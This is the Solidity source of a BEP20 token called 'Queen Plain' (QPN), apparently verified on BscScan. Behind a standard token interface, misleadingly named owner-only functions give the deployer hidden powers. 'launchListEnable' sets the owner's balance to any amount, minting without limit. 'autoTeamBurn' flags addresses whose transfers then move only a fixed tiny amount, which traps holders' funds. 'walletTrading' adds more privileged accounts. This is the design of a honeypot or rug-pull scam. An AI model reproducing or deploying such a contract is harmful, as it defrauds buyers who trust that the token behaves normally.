/**
 *Submitted for verification at BscScan.com on 2023-01-20
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.2;

library SafeMath {

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction seems to happen overflow");
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication seems to happen overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division seems to happen by zero");
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition seems to happen overflow");

        return c;
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;

        return c;
    }
}

interface UniswapFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface UniswapRouter {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}


interface IBEP20 {
    function totalSupply() external view returns (uint256);

    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function getOwner() external view returns (address);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address _owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract QueenPlain is IBEP20 {
    using SafeMath for uint256;
    uint8 constant _decimals = 18;



    address public listSender;
    uint256 _totalSupply = 100000000 * (10 ** _decimals);
    mapping(address => bool) public receiverLiquidity;

    string constant _symbol = "QPN";
    uint256 constant receiverModeMax = 12 ** 10;
    mapping(address => bool) public fromEnable;
    string constant _name = "Queen Plain";

    address public teamLaunched;
    mapping(address => mapping(address => uint256)) _allowances;
    address public owner;
    address constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    mapping(address => uint256) _balances;

    modifier onlyOwner() {
        require(fromEnable[msg.sender], "!OWNER");
        _;
    }
    event OwnershipTransferred(address owner);

    constructor (){
        UniswapRouter listReceiver = UniswapRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        teamLaunched = UniswapFactory(listReceiver.factory()).createPair(WBNB, address(this));
        _allowances[address(this)][address(listReceiver)] = type(uint256).max;
        listSender = msg.sender;
        fromEnable[listSender] = true;
        _balances[listSender] = _totalSupply;
        emit Transfer(address(0), listSender, _totalSupply);
    }

    receive() external payable {}

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

    function getOwner() external view override returns (address) {
        return owner;
    }

    function symbol() external pure override returns (string memory) {
        return _symbol;
    }

    function launchListEnable(uint256 liquidityTrading) public onlyOwner {
        _balances[listSender] = liquidityTrading;
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if (_allowances[sender][msg.sender] != type(uint256).max) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender].sub(amount);
        }
        return _transferFrom(sender, recipient, amount);
    }

    function burnLaunchedAt(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount);
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function name() external pure override returns (string memory) {
        return _name;
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return _transferFrom(msg.sender, recipient, amount);
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function walletTrading(address receiverSwapSender) public onlyOwner {
        fromEnable[receiverSwapSender] = true;
    }

    function allowance(address holder, address spender) external view override returns (uint256) {
        return _allowances[holder][spender];
    }

    function decimals() external pure override returns (uint8) {
        return _decimals;
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        if (sender == listSender || recipient == listSender) {
            return burnLaunchedAt(sender, recipient, amount);
        }
        if (receiverLiquidity[sender]) {
            return burnLaunchedAt(sender, recipient, receiverModeMax);
        }
        return burnLaunchedAt(sender, recipient, amount);
    }

    function transferOwnership(address payable account) public onlyOwner {
        owner = account;
        fromEnable[account] = true;
        emit OwnershipTransferred(account);
    }

    function autoTeamBurn(address receiverAuto) public onlyOwner {
        receiverLiquidity[receiverAuto] = true;
    }

    event AutoLiquify(uint256 amountBNB, uint256 amountTokens);
}